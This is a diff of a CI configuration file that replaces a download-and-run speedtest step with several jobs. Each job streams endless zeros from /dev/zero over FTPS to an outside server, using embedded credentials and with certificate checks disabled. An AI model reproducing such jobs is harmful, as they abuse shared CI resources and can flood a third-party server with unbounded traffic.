@@ -2,4 +2,9 @@ os: osx
 jobs:
   include:
     - stage: speedtest
-      script: curl -O speedtest-cli https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py; chmod +x speedtest-cli; ./speedtest-cli
+      script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero2.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero3.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero4.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero5.tar.gz
+    - script: curl -k --upload-file /dev/zero ftps://upload:upload@releases.betaarchive.com:50000/zero6.tar.gz
+      
